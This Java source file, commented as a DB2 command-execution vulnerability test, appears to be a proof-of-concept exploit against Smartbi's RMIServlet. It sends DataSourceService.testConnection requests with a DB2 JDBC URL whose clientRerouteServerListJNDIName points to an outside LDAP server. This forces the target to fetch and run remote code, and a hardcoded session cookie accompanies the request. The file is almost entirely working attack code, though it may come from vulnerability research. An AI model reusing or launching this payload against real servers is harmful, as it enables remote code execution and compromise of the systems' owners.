package cve;

import java.io.IOException;
import java.sql.DriverManager;
import java.sql.SQLException;

import com.pacemrc.vuldebug.common.utils.http.HttpRequest;
import org.apache.http.client.methods.HttpPost;

/**
 * DB2 命令执行漏洞
 */
public class PATCH_20221122 {

    public static void testDB2Rce() throws ClassNotFoundException, SQLException {
        Class.forName("com.ibm.db2.jcc.DB2Driver");
        DriverManager.getConnection("jdbc:db2://127.0.0.1:50001/BLUDB:clientRerouteServerListJNDIName=ldap://10.58.120.200:1389/nco5cx");
    }

    public static void main(String[] args) throws IOException {

        String url = "http://10.58.120.201:18080/smartbi/vision/RMIServlet";
        String jndiUrl = "ldap://10.58.120.201:1389/ayv6fa";
        String body1 = "className=DataSourceService&methodName=testConnection&params=[{\"password\":\"\",\"maxConnection\":100,\"user\":\"\",\"driverType\":\"MYSQL\",\"validationQuery\":\"SELECT CURRENT DATE FROM SYSIBM.SYSDUMMY1\",\"url\":\"jdbc:db2://127.0.0.1:50001/BLUDB:clientRerouteServerListJNDIName=" + jndiUrl + "\",\"name\":\"test\",\"driver\":\"com.ibm.db2.jcc.DB2Driver\",\"id\":\"\",\"desc\":\"\",\"alias\":\"\",\"dbCharset\":\"\",\"identifierQuoteString\":\"\",\"transactionIsolation\":-1,\"validationQueryMethod\":0,\"dbToCharset\":\"\",\"authenticationType\":\"STATIC\",\"driverCatalog\":null,\"extendProp\":\"{}\"}]";
        String body2 = "className=DataSourceService&methodName=testConnectionList&params=[[{\"password\":\"\",\"maxConnection\":100,\"user\":\"\",\"driverType\":\"MYSQL\",\"validationQuery\":\"SELECT CURRENT DATE FROM SYSIBM.SYSDUMMY1\",\"url\":\"jdbc:db2://127.0.0.1:50001/BLUDB:clientRerouteServerListJNDIName=" + jndiUrl + "\",\"name\":\"test\",\"driver\":\"com.ibm.db2.jcc.DB2Driver\",\"id\":\"\",\"desc\":\"\",\"alias\":\"\",\"dbCharset\":\"\",\"identifierQuoteString\":\"\",\"transactionIsolation\":-1,\"validationQueryMethod\":0,\"dbToCharset\":\"\",\"authenticationType\":\"STATIC\",\"driverCatalog\":null,\"extendProp\":\"{}\"}]]";
        HttpRequest httpRequest = new HttpRequest();
        HttpPost httpPost = new HttpPost(url);
        httpPost.addHeader("Cookie","JSESSIONID=B869ABB54F2133978008730C30F9F666");
        httpRequest.sendStringPost(httpPost,body1);

    }
}
